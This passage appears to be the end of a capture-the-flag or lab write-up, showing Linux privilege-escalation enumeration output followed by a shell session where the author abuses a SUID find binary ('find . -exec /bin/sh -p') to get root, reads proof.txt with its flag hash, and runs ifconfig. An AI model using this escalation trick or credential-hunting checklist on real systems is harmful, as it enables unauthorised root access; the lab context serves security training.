[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. nope
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
sh-4.2$ ./find . -exec /bin/sh -p \; -quit
./find . -exec /bin/sh -p \; -quit
sh: ./find: No such file or directory
sh-4.2$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
sh-4.2# cd /root
cd /root
sh-4.2# ls
ls
proof.txt
sh-4.2# cat proof.txt
cat proof.txt
683dfeb12e6e8aad2e9974f434c10f13
sh-4.2# ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.143.57  netmask 255.255.255.0  broadcast 192.168.143.255
        ether 00:50:56:ba:f0:11  txqueuelen 1000  (Ethernet)
        RX packets 128130  bytes 7966473 (7.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2664  bytes 1826674 (1.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 170  bytes 13228 (12.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 170  bytes 13228 (12.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

sh-4.2# 

```

![](Pasted%20image%2020220203014309.png)

# Others